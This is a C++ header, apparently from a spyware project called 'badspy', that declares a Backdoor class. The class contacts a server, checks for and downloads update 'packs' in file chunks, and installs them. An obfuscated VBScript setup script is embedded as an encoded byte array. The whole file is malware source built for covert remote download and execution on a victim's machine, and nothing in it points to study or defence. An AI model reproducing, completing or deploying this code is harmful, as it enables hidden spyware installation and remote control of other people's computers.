#pragma once
#include "../../badspy.c/net/comm.h"

#define SPY_BDR_FLAG_YES				1
#define SPY_BDR_FLAG_NO					0

#define SPY_BDR_HEADER_CHK_UPDATE		2
#define SPY_BDR_HEADER_DWN_PACK			3
#define SPY_BDR_HEADER_DT_FILENAME		4
#define SPY_BDR_HEADER_DT_FILESIZE		5
#define SPY_BDR_HEADER_DT_FILECHUNK		6
#define SPY_BDR_HEADER_PACKS_LIST		7

#define SPY_BDR_SETUP_PACK_SCRIPT		{51, 57, 109, 139, 115, 142, 121, 126, 122, 141, 44, 127, 123, 139, 44, 141, 116, 130, 127, 57, 114, 130, 120, 126, 70, 57, 135, 147, 117, 137, 44, 127, 117, 133, 113, 150, 44, 116, 113, 145, 128, 139, 109, 124, 128, 57, 114, 136, 120, 125, 113, 139, 105, 38, 22, 38, 22, 92, 109, 133, 120, 57, 99, 108, 111, 139, 117, 137, 128, 71, 95, 133, 113, 126, 124, 65, 61, 73, 60, 73, 53, 38, 22, 38, 22, 108, 113, 141, 44, 140, 116, 126, 120, 133, 44, 86, 44, 92, 126, 126, 109, 141, 113, 104, 110, 131, 113, 124, 128, 65, 46, 112, 95, 124, 126, 130, 124, 141, 58, 108, 116, 126, 120, 133, 46, 66, 25, 35, 95, 126, 128, 57, 114, 140, 123, 57, 73, 57, 79, 139, 113, 122, 128, 126, 91, 123, 118, 126, 111, 141, 52, 59, 95, 124, 126, 130, 124, 141, 117, 135, 115, 71, 82, 130, 120, 126, 95, 146, 127, 141, 113, 134, 91, 123, 118, 126, 111, 141, 46, 66, 25, 35, 25, 35, 134, 130, 124, 95, 117, 133, 113, 57, 73, 57, 99, 108, 111, 139, 117, 137, 128, 71, 77, 139, 115, 142, 121, 126, 122, 141, 127, 71, 85, 141, 113, 134, 52, 73, 53, 38, 22, 93, 117, 134, 44, 127, 123, 133, 112, 126, 126, 38, 22, 38, 22, 98, 114, 57, 99, 108, 111, 139, 117, 137, 128, 71, 77, 139, 115, 142, 121, 126, 122, 141, 127, 71, 79, 136, 129, 135, 128, 57, 73, 57, 61, 57, 96, 129, 113, 135, 51, 57, 112, 136, 44, 135, 123, 141, 44, 125, 113, 127, 117, 135, 113, 57, 113, 145, 128, 139, 109, 124, 128, 57, 114, 136, 120, 125, 113, 139, 56, 57, 127, 136, 44, 142, 127, 130, 122, 128, 44, 124, 129, 139, 126, 126, 122, 141, 44, 127, 123, 133, 112, 126, 126, 57, 128, 136, 44, 125, 123, 57, 128, 129, 117, 140, 25, 35, 21, 141, 121, 137, 90, 122, 121, 126, 44, 86, 44, 127, 127, 136, 58, 96, 113, 141, 96, 126, 121, 137, 90, 122, 121, 126, 25, 35, 21, 127, 123, 133, 112, 126, 126, 57, 73, 57, 114, 140, 123, 71, 83, 126, 128, 105, 109, 139, 113, 135, 128, 95, 123, 133, 112, 126, 126, 103, 109, 134, 113, 65, 99, 108, 111, 139, 117, 137, 128, 71, 95, 124, 126, 130, 124, 141, 82, 142, 120, 133, 90, 122, 121, 126, 53, 57, 55, 57, 46, 117, 46, 57, 55, 57, 128, 134, 124, 103, 109, 134, 113, 38, 22, 94, 120, 140, 113, 38, 22, 34, 114, 136, 120, 125, 113, 139, 44, 86, 44, 112, 95, 124, 126, 130, 124, 141, 58, 90, 126, 128, 129, 134, 113, 135, 128, 140, 58, 98, 128, 126, 121, 65, 61, 66, 25, 35, 81, 135, 112, 57, 85, 127, 25, 35, 25, 35, 85, 127, 44, 103, 123, 141, 44, 127, 127, 136, 58, 95, 123, 133, 112, 126, 126, 94, 132, 130, 127, 141, 127, 65, 114, 136, 120, 125, 113, 139, 53, 57, 96, 129, 113, 135, 25, 35, 21, 127, 127, 136, 58, 92, 126, 126, 109, 141, 113, 95, 123, 133, 112, 126, 126, 65, 114, 136, 120, 125, 113, 139, 53, 38, 22, 94, 122, 125, 44, 98, 114, 38, 22, 38, 22, 108, 113, 141, 44, 136, 110, 131, 95, 129, 113, 133, 120, 57, 73, 57, 79, 139, 113, 122, 128, 126, 91, 123, 118, 126, 111, 141, 52, 59, 95, 129, 113, 133, 120, 71, 77, 137, 124, 133, 117, 124, 109, 141, 117, 136, 122, 59, 53, 38, 22, 108, 113, 141, 44, 127, 117, 133, 113, 140, 85, 135, 102, 130, 124, 86, 123, 123, 118, 108, 116, 126, 120, 133, 58, 103, 109, 134, 113, 108, 124, 122, 111, 126, 52, 147, 117, 137, 82, 130, 120, 126, 53, 71, 117, 141, 113, 134, 127, 38, 22, 92, 109, 133, 120, 57, 123, 123, 118, 108, 116, 126, 120, 133, 58, 103, 109, 134, 113, 108, 124, 122, 111, 126, 52, 127, 123, 133, 112, 126, 126, 66, 58, 92, 123, 137, 133, 97, 113, 139, 113, 65, 114, 130, 120, 126, 127, 98, 122, 115, 117, 137, 56, 57, 63, 73, 69, 75, 53, 38, 22, 38, 22, 92, 109, 133, 120, 57, 114, 140, 123, 71, 80, 126, 120, 126, 128, 126, 82, 130, 120, 126, 52, 147, 117, 137, 82, 130, 120, 126, 53, 38, 22, 38, 22, 130, 122, 140, 128, 122, 120, 133, 82, 130, 120, 126, 44, 86, 44, 127, 127, 136, 58, 91, 129, 130, 120, 125, 92, 122, 128, 129, 52, 127, 123, 133, 112, 126, 126, 69, 44, 59, 117, 135, 127, 141, 109, 133, 120, 71, 110, 122, 128, 59, 53, 38, 22, 98, 114, 57, 114, 140, 123, 71, 82, 130, 120, 126, 81, 145, 117, 140, 128, 140, 52, 130, 122, 140, 128, 122, 120, 133, 82, 130, 120, 126, 53, 57, 96, 129, 113, 135, 25, 35, 21, 92, 109, 133, 120, 57, 127, 129, 113, 133, 120, 71, 94, 142, 122, 65, 79, 129, 126, 65, 63, 77, 53, 57, 50, 57, 117, 135, 127, 141, 109, 133, 120, 95, 117, 133, 113, 57, 50, 57, 79, 129, 126, 65, 63, 77, 53, 69, 44, 73, 56, 57, 82, 122, 120, 140, 113, 66, 25, 35, 81, 135, 112, 57, 85, 127, 25, 35, 25, 35, 127, 141, 126, 108, 111, 139, 117, 137, 128, 57, 73, 57, 99, 140, 111, 139, 117, 137, 128, 71, 95, 124, 126, 130, 124, 141, 82, 142, 120, 133, 90, 122, 121, 126, 25, 35, 114, 140, 123, 71, 80, 126, 120, 126, 128, 126, 82, 130, 120, 126, 52, 140, 128, 139, 95, 124, 126, 130, 124, 141, 53, 38, 22, 38, 22, 108, 113, 141, 44, 136, 110, 131, 95, 129, 113, 133, 120, 57, 73, 57, 90, 136, 128, 129, 117, 135, 115, 38, 22, 108, 113, 141, 44, 127, 127, 136, 44, 86, 44, 103, 123, 141, 116, 130, 122, 128, 25, 35, 95, 126, 128, 57, 127, 129, 113, 133, 120, 57, 73, 57, 90, 136, 128, 129, 117, 135, 115}
#define SPY_BDR_SETUP_PACK_SCRIPT_NAME	"setup.vbs"

struct Version
{
	byte major;
	byte minor;
	byte revision;
};

class Backdoor : public Comm
{
	char * upd_pck_path = NULL;
	const char * root_dir = NULL;
	const char * working_dir = NULL;
	char * script_file_path = NULL;
	bool check_update_avaiable(const Version * version) const;
	bool dwnl_pack(byte id, char * file_path);
	bool dwnl_file(char * file_path) const;
	void install_pack(const char * file_path, bool using_tmpdir = true) const;
	bool export_setup_script() const;
	void create_working_dir_if_necessary() const;
public:
	void install_packs_if_necessary();
	bool check_and_dwnl_update();
	void install_update_pack();
	Backdoor(const char * server_addr, int server_port, const char * working_dir, const char * root_dir);
	~Backdoor();
};
